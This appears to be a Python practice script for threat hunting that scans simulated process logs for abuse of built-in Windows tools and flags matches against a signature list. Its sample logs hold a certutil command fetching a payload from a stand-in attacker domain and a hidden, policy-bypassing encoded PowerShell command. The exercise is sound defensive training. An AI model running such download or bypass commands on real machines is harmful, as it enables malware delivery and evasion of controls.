# ==========================================
# Day 60: Living off the Land (LOLBins) Command-Line Threat Hunter
# Purpose: Practice threat hunting and detection of malicious use of built-in OS utilities
# ==========================================

print("=== LOLBINS COMMAND-LINE THREAT HUNTER ===")

# Simulated endpoint process creation logs (Process Name and full Command Line arguments)
process_logs = [
    {"hostname": "workstation-01", "process": "explorer.exe", "command_line": "C:\\Windows\\explorer.exe"},
    {"hostname": "workstation-01", "process": "certutil.exe", "command_line": "certutil.exe -urlcache -split -f http://evil-domain.com/payload.exe update.exe"},
    {"hostname": "server-db-02", "process": "powershell.exe", "command_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Enc aW52b2tlLWV4cHJlc3Npb24="},
    {"hostname": "workstation-02", "process": "notepad.exe", "command_line": "C:\\Windows\\System32\\notepad.exe notes.txt"}
]

# Known suspicious LOLBin execution indicators / patterns
lolbin_signatures = [
    {"tool": "certutil.exe", "indicator": "-urlcache", "risk": "Malicious Download via Certutil"},
    {"tool": "powershell.exe", "indicator": "-ExecutionPolicy Bypass", "risk": "Script Execution Restriction Bypass"},
    {"tool": "powershell.exe", "indicator": "-Enc", "risk": "Obfuscated PowerShell Command Execution"}
]

def hunt_lolbins(logs, signatures):
    print("[*] Scanning endpoint process telemetry for Living off the Land (LOLBin) abuse...\n")
    threats_found = 0
    
    for log in logs:
        host = log["hostname"]
        proc = log["process"].lower()
        cmd = log["command_line"]
        
        matched_risk = None
        for sig in signatures:
            if sig["tool"] == proc and sig["indicator"].lower() in cmd.lower():
                matched_risk = sig["risk"]
                break
                
        if matched_risk:
            threats_found += 1
            print(f"  🚨 [LOLBIN THREAT DETECTED]: Suspicious administrative tool abuse!")
            print(f"     ├─ Hostname: {host}")
            print(f"     ├─ Process: {proc}")
            print(f"     ├─ Command Line: {cmd}")
            print(f"     └─ Associated Risk: {matched_risk}\n")
        else:
            print(f"  ✅ [NORMAL]: Process '{proc}' on {host} evaluated clean.")
            
    return threats_found

# Run the LOLBin threat hunt
total_threats = hunt_lolbins(process_logs, lolbin_signatures)

print("\n--- THREAT HUNT SUMMARY ---")
if total_threats > 0:
    print(f"  ⚠️ [ALERT]: Flagged {total_threats} suspicious process execution(s) using LOLBins!")
    print(f"     └─ Action Required: Isolate host network interface and review user activity.")
else:
    print("  ✅ [SECURE]: All process command lines adhere to standard baselines.")

print("==========================================")